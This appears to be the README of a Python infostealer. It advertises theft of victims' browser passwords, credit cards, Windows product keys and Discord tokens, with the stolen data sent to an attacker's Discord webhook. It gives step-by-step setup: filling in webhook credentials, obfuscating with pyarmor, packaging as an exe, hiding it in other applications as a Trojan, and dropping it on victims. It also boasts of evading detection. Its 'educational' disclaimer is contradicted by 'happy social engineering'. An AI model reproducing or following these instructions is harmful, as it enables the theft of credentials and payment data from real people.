  <p align="center">
    victim's passwords & discord token's > all data sent to your Discord webhook of choice.
  
---------------------------------------------------
>> utilizes discord's webhooks > sends passwords in a .zip, and token in chat

>> supports majority of chromium based browsers, is definitely open to improvement

>> mostly FUD, not 100%

>> steals : credit cards, passwords, windows product key, & Discord token

### USING :
* [PYTHON]

### INSTRUCTIONS :
>> my webhook feature is slightly unusual, however it's easy to understand :

>> you'll want to find : "whID" & "whAT" : ID = Webhook ID, AT = Webhook Authorization Token 

>> highlighted are these two variables: https//discordcom/api/webhooks/**00000000**/**qwertyuiop**

>> simply find these in your webhook, and replace the variables with your data : script fully built.

>> you'll either want to pack the script with pyarmor, & then exe it > or .exe it, either one.

>> drop to victim, and wait for them to run : the script is ideal to be placed into other applications, much like a "Trojan Horse" .

>> happy social engineering ! disclaimer: educational purposed

### PY > EXE :

cmd prompt > "cd path/where/python-file/is"

```pip install pyinstaller```

```pyinstaller --clean --onefile --i icon.ico file.py```
